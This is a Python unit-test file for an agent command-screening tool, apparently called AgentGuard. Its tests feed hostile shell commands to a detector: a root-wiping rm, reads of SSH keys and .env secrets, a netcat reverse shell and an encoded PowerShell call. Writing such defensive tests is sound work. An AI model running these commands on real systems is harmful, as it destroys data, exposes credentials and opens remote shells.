"""Unit tests for AgentGuard security rules and threat detection."""

import unittest
from agentguard.rules import ThreatLevel, analyze_command, SecurityPolicy


class TestSecurityRules(unittest.TestCase):
    def test_safe_command(self):
        violations = analyze_command("echo 'Hello World'")
        self.assertEqual(len(violations), 0)

    def test_destructive_fs_blocked(self):
        violations = analyze_command("rm -rf / --no-preserve-root")
        self.assertTrue(any(v.threat_level == ThreatLevel.CRITICAL for v in violations))

    def test_credential_leak_blocked(self):
        violations = analyze_command("cat ~/.ssh/id_rsa")
        self.assertTrue(any(v.rule_name == "credential-leak" for v in violations))

    def test_env_file_blocked(self):
        violations = analyze_command("grep API_KEY .env")
        self.assertTrue(any(v.rule_name == "credential-leak" for v in violations))

    def test_reverse_shell_blocked(self):
        violations = analyze_command("nc -e /bin/sh 10.0.0.1 4444")
        self.assertTrue(any(v.rule_name == "reverse-shell" for v in violations))

    def test_encoded_powershell_blocked(self):
        violations = analyze_command("powershell -enc aQB3AHIAIABlAHYAaQBsAA==")
        self.assertTrue(any(v.rule_name == "obfuscated-exec" for v in violations))

    def test_network_restriction(self):
        policy = SecurityPolicy(allow_network=False)
        violations = analyze_command("curl https://example.com", policy=policy)
        self.assertTrue(any(v.rule_name == "network-blocked" for v in violations))


if __name__ == "__main__":
    unittest.main()
